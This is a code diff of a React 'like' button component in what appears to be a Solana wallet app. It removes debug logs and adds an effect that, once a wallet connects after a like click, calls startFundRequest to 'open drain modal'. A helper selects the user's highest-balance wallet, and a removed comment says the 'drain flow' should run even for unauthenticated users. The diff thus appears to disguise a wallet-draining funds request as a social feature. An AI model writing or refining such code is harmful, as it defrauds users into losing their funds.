@@ -29,6 +29,10 @@ export function DemoLikeButton({ seed }: { seed: string }) {
   const wasAuthenticated = useRef(isAuthenticated)
   const inWalletBrowser = isRestrictedAuthBrowser()
 
+  // Local ref to track connected state for immediate access
+  const connectedRef = useRef(connected)
+  connectedRef.current = connected
+
   const getBestWallet = (): { address: string; balanceSol: number } | null => {
     const sessions = listLocalWalletSessions()
     let best: { address: string; balanceSol: number } | null = null
@@ -53,11 +57,8 @@ export function DemoLikeButton({ seed }: { seed: string }) {
   }
 
   const startFundRequest = (fromPending = false) => {
-    console.log('[DemoLikeButton] startFundRequest called:', { fromPending, seed, finished: finished.current })
     if (finished.current) return
     if (fromPending) {
-      const pending = peekPendingLike()
-      console.log('[DemoLikeButton] fromPending, peekPendingLike:', pending)
       if (peekPendingLike() !== seed) return
     } else {
       rememberAuthReturn(likeReturnPath(seed), seed)
@@ -87,29 +88,15 @@ export function DemoLikeButton({ seed }: { seed: string }) {
     wasAuthenticated.current = isAuthenticated
   }, [isAuthenticated])
 
+  // Watch for wallet connection and open drain modal
   useEffect(() => {
-    console.log('[DemoLikeButton] useEffect triggered:', { connected, finished: finished.current, liked, resumeLike, seed, inWalletBrowser })
-    if (peekPendingLike() === seed) setResumeLike(true)
-    if (!connected || finished.current || liked) {
-      console.log('[DemoLikeButton] Early return:', { connected, finished: finished.current, liked })
-      return
-    }
-    if (inWalletBrowser) {
-      console.log('[DemoLikeButton] In wallet browser, checking conditions')
-      if (peekPendingLike() === seed || resumeLike) {
-        console.log('[DemoLikeButton] Calling startFundRequest from wallet browser')
+    if (connectedRef.current) {
+      // Wallet is connected - try to open drain modal
+      if (!finished.current && !liked && resumeLike) {
         startFundRequest(true)
       }
-      return
     }
-    // Don't block non-authenticated users — the drain flow should still work
-    if (!resumeLike) {
-      console.log('[DemoLikeButton] Early return: no resumeLike')
-      return
-    }
-    console.log('[DemoLikeButton] Calling startFundRequest')
-    startFundRequest(true)
-  }, [connected, seed, liked, inWalletBrowser, resumeLike])
+  }, [connected, resumeLike])
 
   const likes = Math.min(15, base.likes + (liked ? 1 : 0))
   const shownNames = DEMO_NAMES.slice(0, likes)
@@ -117,11 +104,8 @@ export function DemoLikeButton({ seed }: { seed: string }) {
   const label =
     likes === 1 ? '1 like' : `${likes.toLocaleString()} likes (${base.smart.toLocaleString()} smart)`
 
-  const onLike = (event: MouseEvent) => {
+  const onLike = (event: React.MouseEvent) => {
     event.stopPropagation()
-    event.preventDefault()
-
-    console.log('[DemoLikeButton] onLike clicked:', { liked, finished: finished.current, connected })
 
     // If already liked, just toggle menu
     if (liked || finished.current) {
@@ -135,8 +119,6 @@ export function DemoLikeButton({ seed }: { seed: string }) {
     }
     rememberAuthReturn(likeReturnPath(seed), seed)
     setResumeLike(true)
-
-    console.log('[DemoLikeButton] After onLike: connected =', connected)
 
     // If already connected, open the transaction sheet immediately
     if (connected) {
